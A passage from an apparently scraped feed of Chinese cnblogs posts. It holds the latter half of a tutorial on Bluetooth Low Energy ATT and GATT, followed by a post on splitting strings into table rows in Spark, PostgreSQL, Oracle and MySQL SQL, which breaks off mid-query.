0xFFFF。</p>\n<p class=\"js_darkmode__331\"><strong class=\"js_darkmode__332\">Attribute Type</strong>&nbsp;：定义这到底是什么数据。使用 UUID 标识（如 0x2800 代表<strong class=\"js_darkmode__333\">服务声明</strong>，0x2A37 代表<strong class=\"js_darkmode__334\">心率测量值</strong>）。</p>\n<p class=\"js_darkmode__335\"><strong class=\"js_darkmode__336\">Attribute Value</strong>&nbsp;：实际的数据载体。长度可变（0 ~ 512 字节）。</p>\n<p class=\"js_darkmode__337\"><strong class=\"js_darkmode__338\">Attribute Permissions</strong>：定义谁可以访问该属性（读/写/加密要求）。注意：权限不通过空中传输，仅存在于服务器内部逻辑中。</p>\n<h3 class=\"js_darkmode__339\"><span class=\"js_darkmode__340\">（3）ATT PDU 类型 (通信方式)</span></h3>\n<p class=\"js_darkmode__341\">ATT 协议定义了 6 种基本的通信交互模式 (PDU Types)。理解这 6 种模式是理解 BLE 数据流的关键。</p>\n<p class=\"js_darkmode__342\"><strong class=\"js_darkmode__343\">（A）请求</strong>&nbsp;(<strong class=\"js_darkmode__344\">Request</strong>) 由 Client -&gt; Server，客户端发送请求，<strong class=\"js_darkmode__345\">必须</strong>等待服务器回复响应，比如：手机读取手环电量 (<code class=\"js_darkmode__346\">Read Request</code>)。 特点是：串行，慢，但可靠。</p>\n<p class=\"js_darkmode__347\"><strong class=\"js_darkmode__348\">（B）响应</strong>(<strong class=\"js_darkmode__349\">Response</strong>)：由 Server -&gt; Client，服务器对请求的回复，比如：手环回复电量值 (<code class=\"js_darkmode__350\">Read Response</code>)。</p>\n<p class=\"js_darkmode__351\"><strong class=\"js_darkmode__352\">（C）命令</strong>&nbsp;(<strong class=\"js_darkmode__353\">Command</strong>)：由 Client -&gt; Server 。客户端发送数据，<strong class=\"js_darkmode__354\">不需要</strong>服务器回复。也叫 \"Write without Response\"。比如：手机快速向智能灯泡发送调色指令。</p>\n<p class=\"js_darkmode__355\">特点是：由底层链路层保证数据到达，应用层不确认，速度最快</p>\n<p class=\"js_darkmode__356\"><strong class=\"js_darkmode__357\">（D）通知</strong>&nbsp;(<strong class=\"js_darkmode__358\">Notification</strong>)： 由 Server -&gt; Client。服务器主动推送数据，<strong class=\"js_darkmode__359\">不需要</strong>客户端确认。比如：心率带每秒推送一次实时心率。特点是：最常用的数据上报方式，吞吐量高。</p>\n<p class=\"js_darkmode__360\"><strong class=\"js_darkmode__361\">（E）指示</strong>&nbsp;(<strong class=\"js_darkmode__362\">Indication</strong>)：由Server -&gt; Client。服务器主动推送数据，<strong class=\"js_darkmode__363\">必须</strong>等待客户端回复确认。在收到确认前，服务器不能发下一条。比如：血糖仪发送血糖结果（数据至关重要，必须确保对方应用层收到了）。</p>\n<p class=\"js_darkmode__364\">特点是：慢，但在应用层极其可靠</p>\n<p class=\"js_darkmode__365\"><strong class=\"js_darkmode__366\">（F）确认</strong>&nbsp;(<strong class=\"js_darkmode__367\">Confirmation</strong>)：由 Client -&gt; Server。是客户端收到指示 (Indication) 后的回复。</p>\n<h3 class=\"js_darkmode__368\"><span class=\"js_darkmode__369\">（4）增强型 ATT (Enhanced ATT, EATT)</span></h3>\n<p class=\"js_darkmode__370\">增强型 ATT (Enhanced ATT, EATT) 这是从蓝牙 5.2 引入并在 V5.3 中继续强化的重要特性。</p>\n<p class=\"js_darkmode__371\"><strong class=\"js_darkmode__372\">传统 ATT (Legacy ATT):</strong>&nbsp;是<strong>顺序 (Sequential)</strong>的。如果你发送了一个 Read Request，在收到 Read Response 之前，你不能发送任何其他请求。</p>\n<p class=\"js_darkmode__373\">这就像单行道，容易造成阻塞（Head-of-Line Blocking）。</p>\n<p class=\"js_darkmode__374\"><strong class=\"js_darkmode__375\">增强型 ATT (EATT):</strong>&nbsp;它运行在 L2CAP 的增强型基于信用的流量控制 (Enhanced Credit Based Flow Control) 模式之上。</p>\n<p class=\"js_darkmode__376\">它的特点是：</p>\n<ul class=\"list-paddingleft-1 js_darkmode__377\">\n<li><strong class=\"js_darkmode__379\">支持并发 (Concurrent):</strong>&nbsp;允许同时执行多个 ATT 事务。</li>\n<li><strong class=\"js_darkmode__381\">低延迟：</strong>&nbsp;优先级高的命令不会被前面正在处理的大数据包阻塞。</li>\n<li><strong class=\"js_darkmode__383\">MTU:</strong>&nbsp;EATT 的 MTU 是独立配置的，通常更灵活。</li>\n</ul>\n<p class=\"js_darkmode__384\">在 V5.3 设备中，如果双方都支持 EATT，设备将优先建立 EATT 信道以提升用户体验（如音频流传输时的同时控制操作）。</p>\n<h3 class=\"js_darkmode__385\"><span class=\"js_darkmode__386\">（5）ATT MTU (最大传输单元)</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161848815-585472060.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__388\">ATT_MTU 决定了在一个数据包中最多能传多少字节的有效载荷。默认值为 23 字节 (BLE 4.0)。</p>\n<p class=\"js_darkmode__389\"><strong class=\"js_darkmode__390\">典型值：</strong>&nbsp;为247 字节 (常见的 DLE 扩展后数值) 或 512 字节 (最大)。</p>\n<p class=\"js_darkmode__391\">ATT连接建立后，客户端通常会发起&nbsp;<code class=\"js_darkmode__392\">Exchange MTU Request</code>，双方协商使用两者支持的较小值。</p>\n<h2 class=\"js_darkmode__393\"><span class=\"js_darkmode__394\">（五）GATT (Generic Attribute Profile)</span></h2>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161900151-965016108.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__396\">如果 ATT 是负责运输数据的<strong class=\"js_darkmode__397\">卡车</strong>，那么&nbsp;<strong class=\"js_darkmode__398\">GATT</strong>&nbsp;(Generic Attribute Profile) 就是定义货物如何打包、存放、分类以及如何进行存取操作的<strong class=\"js_darkmode__399\">仓库管理规范</strong>。</p>\n<h3 class=\"js_darkmode__400\"><span class=\"js_darkmode__401\">（1）GATT 核心概念与角色 (Roles)</span></h3>\n<p class=\"js_darkmode__402\">GATT 定义了两个在数据交换中完全不同的角色。请注意，这与链路层的主机 (Central/Master) 和从机 (Peripheral/Slave) 概念是独立的，尽管通常存在某种映射关系。</p>\n<p class=\"js_darkmode__403\"><strong class=\"js_darkmode__404\">GATT Server (服务端):</strong>&nbsp;拥有数据并接受数据访问请求的设备。它的职责是存储数据（Services 和 Characteristics），响应 Client 的读/写请求，或主动向 Client 推送数据。比如智能手环(存有心率数据)</p>\n<p class=\"js_darkmode__405\"><strong class=\"js_darkmode__406\">GATT Client (客户端):</strong>&nbsp;发起命令和请求，试图读取或写入数据的设备。它的职责是执行服务发现 (Service Discovery)，发起读写操作，接收 Server 推送的数据。比如智能手机（想要读取手环的心率）。</p>\n<h3 class=\"js_darkmode__407\"><span class=\"js_darkmode__408\">（2）GATT 数据层级结构 (Hierarchy)</span></h3>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161916556-43068230.png\" />\n<p class=\"js_darkmode__410\">GATT 最重要的贡献是定义了严格的数据层级结构，使得不同厂商的设备可以互相理解。</p>\n<p class=\"js_darkmode__411\"><strong class=\"js_darkmode__412\">（A）Profile (配置文件)</strong>&nbsp;Profile 实际上不是 GATT 协议本身定义的实体，而是由 Bluetooth SIG 或厂商定义的<strong class=\"js_darkmode__413\">集合</strong>。一个 Profile 可能包含一个或多个 Service。</p>\n<p class=\"js_darkmode__414\"><strong class=\"js_darkmode__415\">（B）Service (服务)</strong>&nbsp;:Service 是数据和相关行为的逻辑集合，用于实现特定的功能或特性。这里分三种服务：</p>\n<p class=\"js_darkmode__416\"><strong class=\"js_darkmode__417\">Primary Service (首要服务):</strong>&nbsp;暴露设备主要功能的服务。</p>\n<p class=\"js_darkmode__418\"><strong class=\"js_darkmode__419\">Secondary Service (次要服务):</strong>&nbsp;仅作为被引用的辅助服务（较少见）。</p>\n<p class=\"js_darkmode__420\"><strong class=\"js_darkmode__421\">Include Service (引用服务):</strong>&nbsp;一个服务可以引用另一个服务（类似于编程中的&nbsp;<code class=\"js_darkmode__422\"><a class=\"wx_topic_link\">#include</a></code>），例如<strong class=\"js_darkmode__423\">跑步服务</strong>可能引用<strong class=\"js_darkmode__424\">心率服务</strong>。</p>\n<p class=\"js_darkmode__425\"><strong class=\"js_darkmode__426\">（C）Characteristic (特征)</strong>&nbsp;:Characteristic 是 GATT 中最小的逻辑数据单元，包含实际的数据值。它由三个主要部分组成：</p>\n<p class=\"js_darkmode__427\"><strong class=\"js_darkmode__428\">Declaration (声明):</strong>&nbsp;包含属性（读、写、通知等）、Handle（句柄）和 UUID。</p>\n<p class=\"js_darkmode__429\"><strong class=\"js_darkmode__430\">Value (值):</strong>&nbsp;实际的数据（例如：心率值&nbsp;<code class=\"js_darkmode__431\">0x48</code>）。</p>\n<p class=\"js_darkmode__432\"><strong class=\"js_darkmode__433\">Descriptor (描述符):</strong>&nbsp;（可选）关于特征的额外信息。</p>\n<p class=\"js_darkmode__434\"><strong class=\"js_darkmode__435\">（D）Descriptor (描述符)</strong>&nbsp;:对 Characteristic 的进一步描述或配置。</p>\n<p class=\"js_darkmode__436\">最著名的 Descriptor 是&nbsp;<strong class=\"js_darkmode__437\">CCCD (Client Characteristic Configuration Descriptor)<strong class=\"js_darkmode__438\">。Client 必须写入这个描述符来</strong>开启</strong>&nbsp;Server 的通知 (Notify) 或指示 (Indicate) 功能。</p>\n<h3 class=\"js_darkmode__439\"><span class=\"js_darkmode__440\">（3）GATT 核心操作流程 (GATT Procedures)</span></h3>\n<p class=\"js_darkmode__441\"><strong class=\"js_darkmode__442\">（A）配置与发现 (Discovery)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116161949206-724330768.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__444\">Client 连接 Server 后，通常不知道 Server 有什么功能，需要进行发现：</p>\n<ul class=\"list-paddingleft-1 js_darkmode__445\">\n<li>\n<p class=\"js_darkmode__447\"><strong class=\"js_darkmode__448\">Discover Primary Services:</strong>&nbsp;找出设备支持的所有主要服务。</p>\n</li>\n<li>\n<p class=\"js_darkmode__450\"><strong class=\"js_darkmode__451\">Discover Characteristics:</strong>&nbsp;找出某个服务下有哪些特征。</p>\n</li>\n<li>\n<p class=\"js_darkmode__453\"><strong class=\"js_darkmode__454\">Discover Descriptors:</strong>&nbsp;找出特征下有哪些描述符。</p>\n</li>\n<li>\n<p class=\"js_darkmode__456\"><strong class=\"js_darkmode__457\">Exchange MTU:</strong>&nbsp;协商最大传输单元，以决定一次能传多少字节（蓝牙 4.2/5.0+ 之后非常重要，以提高吞吐量）。</p>\n</li>\n</ul>\n<p class=\"js_darkmode__458\"><strong class=\"js_darkmode__459\">（B）数据读取 (Client -&gt; Server)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116162000883-391759881.png\" />\n<ul class=\"list-paddingleft-1 js_darkmode__461\">\n<li><strong class=\"js_darkmode__463\">Read Characteristic Value:</strong>&nbsp;读取某个句柄的值。</li>\n<li><strong class=\"js_darkmode__465\">Read Blob:</strong>&nbsp;读取长数据的片段（当数据超过 MTU 时）。</li>\n<li><strong class=\"js_darkmode__467\">Read Multiple:</strong>&nbsp;一次性读取多个句柄的值。</li>\n</ul>\n<p class=\"js_darkmode__468\"><strong class=\"js_darkmode__469\">（C）数据写入 (Client -&gt; Server)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116162012058-1758124561.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<ul class=\"list-paddingleft-1 js_darkmode__471\">\n<li><strong class=\"js_darkmode__473\">Write Request:</strong>&nbsp;Client 写入数据，Server&nbsp;<strong class=\"js_darkmode__474\">必须回复</strong>&nbsp;(Ack)。可靠，但慢。</li>\n<li><strong class=\"js_darkmode__476\">Write Command (Write without Response):</strong>&nbsp;Client 写入数据，Server&nbsp;<strong class=\"js_darkmode__477\">不回复</strong>。速度快，用于高吞吐量场景（如 OTA 升级）。</li>\n<li><strong class=\"js_darkmode__479\">Signed Write:</strong>&nbsp;带有签名的写入，用于未加密连接但需要认证的场景。</li>\n</ul>\n<p class=\"js_darkmode__480\"><strong class=\"js_darkmode__481\">（D）服务器发起的数据推送 (Server -&gt; Client)</strong></p>\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/555985/202601/555985-20260116162012058-1758124561.png\" style=\"display: block; margin-left: auto; margin-right: auto;\" />\n<p class=\"js_darkmode__483\">这是 BLE 低功耗的关键，Client 不需要一直轮询 (Polling)，而是订阅后等待 Server 推送。</p>\n<ul class=\"list-paddingleft-1 js_darkmode__484\">\n<li><strong class=\"js_darkmode__486\">Notification (通知):</strong>&nbsp;Server 发送数据给 Client，Client&nbsp;<strong class=\"js_darkmode__487\">不回复</strong>。速度快，但如果丢包不会重传。</li>\n<li><strong class=\"js_darkmode__489\">Indication (指示):</strong>&nbsp;Server 发送数据给 Client，Client&nbsp;<strong class=\"js_darkmode__490\">必须回复</strong>&nbsp;Confirmation。可靠，但在收到回复前 Server 不能发下一条，速度较慢。</li>\n</ul>\n<p class=\"js_darkmode__491\">注意： 要启用 Notification 或 Indication，Client 必须先在对应的 CCCD (描述符) 中写入特定的值。</p>\n<h2 class=\"js_darkmode__492\"><span class=\"js_darkmode__493\">结尾</span></h2>\n<p class=\"js_darkmode__494\">随着低功耗蓝牙的普及，Host 层的改进越来越趋向于<strong class=\"js_darkmode__495\">高效率</strong>和<strong class=\"js_darkmode__496\">低延迟</strong>。理解 GAP 的连接管理、ATT 的原子操作以及 GATT 的层级解构，是开发高性能蓝牙产品的基本。</p>\n<p class=\"js_darkmode__497\">希望这篇文章能有助于你更好地理解蓝牙协议栈及其工作原理。</p>\n<center>------------------End------------------</center><center>如需获取更多内容</center><center>请关注<span style=\"color: rgba(0, 0, 255, 1); font-size: large;\">&nbsp;liwen01&nbsp;</span>公众号</center>\n<div>\n<div class=\"appmsg_card_context wx_profile_card wx-root wx_tap_card wx_card_root common-webchat\">\n<div class=\"wx_profile_card_inner\">\n<div class=\"wx_profile_card_bd\">\n<div class=\"wx_profile weui-flex\">\n<div class=\"wx_profile_bd weui-flex weui-flex__item\">\n<div class=\"weui-flex__item\">\n<div class=\"wx_profile_nickname_wrp\">&nbsp;</div>\n<div class=\"wx_profile_tips\" id=\"js_a11y_wx_profile_tips\">&nbsp;</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 08:42</span>&nbsp;\n<a href=\"https://www.cnblogs.com/liwen01\">liwen01</a>&nbsp;\n阅读(<span id=\"post_view_count\">141</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "字符串分割并展开成表格的SQL实现方法",
      "link": "https://www.cnblogs.com/davablog/p/19497701",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/davablog/p/19497701\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 08:08\">\n    <span>字符串分割并展开成表格的SQL实现方法</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h1>一、场景案例</h1>\n<div>在数据开发类项目中，常常会遇到需要将字符串进行切割并展开成表格的场景，如以下两种常见的案例：</div>\n<ol>\n<li>标签类型数据：如将员工标签类型的数据\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(128, 128, 128, 1);\">-</span><span style=\"color: rgba(0, 0, 0, 1);\"> 技能：Java、Spring、微服务、项目管理\n</span><span style=\"color: rgba(128, 128, 128, 1);\">-</span><span style=\"color: rgba(0, 0, 0, 1);\"> 项目经验：电商、金融、教育<br /></span><span style=\"color: rgba(128, 128, 128, 1);\">-</span> 工作风格：#执行力强 #跨部门协作 #数据驱动</pre>\n</div>\n</li>\n<li>分类层级数据：如将组织部门层级数据：“/集团/分公司/信息技术部/数据团队”</li>\n</ol>\n<p>除此之外，在一些特定的业务场景中，如证券场景中，需要将一笔回购合约涉及到的多个质押券进行拆分（提取每个质押券有质押数量及对应标准券转换比例），数据示例如下：</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>&nbsp;另外，API请求的返回的数据多为半结构化的字典列表数据，需要将每行数据从列表中进行提取出来再进行后续的处理，如以下数据：</p>\n<div class=\"cnblogs_code\">\n<pre>{\"data\"<span style=\"color: rgba(0, 0, 0, 1);\">: [<br />　　 {</span>\"AMOUNT\":-9000,\"SUB_TYPE_NAME\":\"债券分销\",\"BRANCH_NAME\":\"银行间\",\"TYPE_NAME\":\"收入\",\"BUSI_DATE\":\"20250831\",\"PROJECT_NAME\":\"调整1月分销佣金-24****MTN001\"<span style=\"color: rgba(0, 0, 0, 1);\">},\n    {</span>\"AMOUNT\":-1075.61,\"SUB_TYPE_NAME\":\"债券分销\",\"BRANCH_NAME\":\"银行间\",\"TYPE_NAME\":\"收入\",\"BUSI_DATE\":\"20250531\",\"PROJECT_NAME\":\"调整计提1月及3月分销佣金\"<span style=\"color: rgba(0, 0, 0, 1);\">}\n    ],\n</span>\"success\":<span style=\"color: rgba(0, 0, 255, 1);\">true</span><span style=\"color: rgba(0, 0, 0, 1);\">\n}</span></pre>\n</div>\n<h1>二，各类主流SQL方言实现方法</h1>\n<p>针对这类场景，目前没有标准SQL函数支持实现该功能。各类SQL方言通过自定义方法进行支持，以下是常用的实现方法。</p>\n<div id=\"tvoo-1768690884647\">\n<h2>Spark/Hive SQL</h2>\n</div>\n<div>采用split + explode（及升级版posexplode）。以下为测试案例：</div>\n<div><img alt=\"0\" class=\"lazyload\" /></div>\n<div>&nbsp;利用该方法可以轻松的回购质押券进行拆分处理：</div>\n<div>\n<p><img alt=\"image\" class=\"lazyload\" height=\"265\" width=\"905\" /></p>\n</div>\n<h2 id=\"hxy0-1768690884655\">PostgreSQL</h2>\n<div>有两种方法：</div>\n<div>方法一：首先利用string_to_array将字符串切割成数组，然后利用unnest将数组扩展成表</div>\n<div><img alt=\"image\" class=\"lazyload\" height=\"140\" width=\"455\" /></div>\n<div>方法二：直接利用regexp_split_to_table将字符串切割并转换成表</div>\n<div><img alt=\"image\" class=\"lazyload\" height=\"151\" width=\"457\" /></div>\n<div>\n<div class=\"cnblogs_code\"><img class=\"code_img_closed lazyload\" id=\"code_img_closed_384da3ac-fe03-4ded-b878-03d509f19394\" /><img class=\"code_img_opened lazyload\" id=\"code_img_opened_384da3ac-fe03-4ded-b878-03d509f19394\" style=\"display: none;\" />\n<div class=\"cnblogs_code_hide\" id=\"cnblogs_code_open_384da3ac-fe03-4ded-b878-03d509f19394\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">select</span> string_to_array(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple,banana,orange</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(0, 0, 255, 1);\">as</span><span style=\"color: rgba(0, 0, 0, 1);\"> item;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">select</span> string_to_array(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple|banana|orange</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">|</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(0, 0, 255, 1);\">as</span><span style=\"color: rgba(0, 0, 0, 1);\"> item;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">select</span> unnest(string_to_array(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple,banana,orange</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">,</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>)) <span style=\"color: rgba(0, 0, 255, 1);\">as</span><span style=\"color: rgba(0, 0, 0, 1);\"> item;\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">select</span> regexp_split_to_array(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple|banana|orange</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">\\|</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(0, 0, 255, 1);\">as</span><span style=\"color: rgba(0, 0, 0, 1);\"> item;\n</span><span style=\"color: rgba(0, 0, 255, 1);\">select</span> regexp_split_to_table(<span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple|banana|orange</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">\\|</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>) <span style=\"color: rgba(0, 0, 255, 1);\">as</span> item;</pre>\n</div>\n<span class=\"cnblogs_code_collapse\">View Code</span></div>\n</div>\n<h2 id=\"AoqL-1768690884660\">Oracle</h2>\n<div>利用connect by + Level来实现</div>\n<div>\n<p><img alt=\"0\" class=\"lazyload\" /></p>\n<div class=\"cnblogs_code\"><img class=\"code_img_closed lazyload\" id=\"code_img_closed_0763077f-3809-4cd8-a83d-7e204a54ea87\" /><img class=\"code_img_opened lazyload\" id=\"code_img_opened_0763077f-3809-4cd8-a83d-7e204a54ea87\" style=\"display: none;\" />\n<div class=\"cnblogs_code_hide\" id=\"cnblogs_code_open_0763077f-3809-4cd8-a83d-7e204a54ea87\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">WITH</span> CTE_DATA <span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> (\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">tom</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> NAME, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">apple,banana,cherry</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> FRUIT <span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> DUAL\n)\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> NAME, REGEXP_SUBSTR(FRUIT, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">[^,]+</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>, <span style=\"color: rgba(0, 0, 255, 1);\">LEVEL</span>) <span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> FRUIT\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span><span style=\"color: rgba(0, 0, 0, 1);\"> CTE_DATA\nCONNECT </span><span style=\"color: rgba(0, 0, 255, 1);\">BY</span> REGEXP_SUBSTR(FRUIT, <span style=\"color: rgba(255, 0, 0, 1);\">'</span><span style=\"color: rgba(255, 0, 0, 1);\">[^,]+</span><span style=\"color: rgba(255, 0, 0, 1);\">'</span>, <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span>, <span style=\"color: rgba(0, 0, 255, 1);\">LEVEL</span>) <span style=\"color: rgba(0, 0, 255, 1);\">IS</span> <span style=\"color: rgba(128, 128, 128, 1);\">NOT</span> <span style=\"color: rgba(0, 0, 255, 1);\">NULL</span><span style=\"color: rgba(0, 0, 0, 1);\">\n;</span></pre>\n</div>\n<span class=\"cnblogs_code_collapse\">View Code</span></div>\n</div>\n<h2 id=\"7fPr-1768690884678\">MySQL</h2>\n<div>5.x+版本只能使用数字辅助表+SUBSTRING_INDEX。</div>\n<div>\n<p><img alt=\"image\" class=\"lazyload\" height=\"360\" width=\"926\" /></p>\n</div>\n<div>\n<div class=\"cnblogs_code\"><img class=\"code_img_closed lazyload\" id=\"code_img_closed_2f00195d-6b1a-4823-9aaf-ce74dfcdb1ee\" /><img class=\"code_img_opened lazyload\" id=\"code_img_opened_2f00195d-6b1a-4823-9aaf-ce74dfcdb1ee\" style=\"display: none;\" />\n<div class=\"cnblogs_code_hide\" id=\"cnblogs_code_open_2f00195d-6b1a-4823-9aaf-ce74dfcdb1ee\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">CREATE</span> <span style=\"color: rgba(0, 0, 255, 1);\">TABLE</span> <span style=\"color: rgba(0, 0, 255, 1);\">IF</span> <span style=\"color: rgba(128, 128, 128, 1);\">NOT</span> <span style=\"color: rgba(128, 128, 128, 1);\">EXISTS</span> numbers (n <span style=\"color: rgba(0, 0, 255, 1);\">INT</span> <span style=\"color: rgba(0, 0, 255, 1);\">PRIMARY</span> <span style=\"color: rgba(0, 0, 255, 1);\">KEY</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n</span><span style=\"color: rgba(0, 0, 255, 1);\">INSERT</span> <span style=\"color: rgba(0, 0, 255, 1);\">INTO</span><span style=\"color: rgba(0, 0, 0, 1);\"> numbers\n</span><span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> a.N <span style=\"color: rgba(128, 128, 128, 1);\">+</span> b.N <span style=\"color: rgba(128, 128, 128, 1);\">*</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">10</span> <span style=\"color: rgba(128, 128, 128, 1);\">+</span> c.N <span style=\"color: rgba(128, 128, 128, 1);\">*</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">100</span> <span style=\"color: rgba(128, 128, 128, 1);\">+</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span><span style=\"color: rgba(0, 0, 0, 1);\"> n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">FROM</span> (<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> N <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">2</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">3</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">4</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">5</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">6</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">7</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">8</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">9</span><span style=\"color: rgba(0, 0, 0, 1);\">) a\n</span><span style=\"color: rgba(0, 0, 255, 1);\">CROSS</span> <span style=\"color: rgba(128, 128, 128, 1);\">JOIN</span> (<span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">0</span> <span style=\"color: rgba(0, 0, 255, 1);\">AS</span> N <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: bold;\">1</span> <span style=\"color: rgba(0, 0, 255, 1);\">UNION</span> <span style=\"color: rgba(0, 0, 255, 1);\">SELECT</span> <span style=\"color: rgba(128, 0, 0, 1); font-weight: 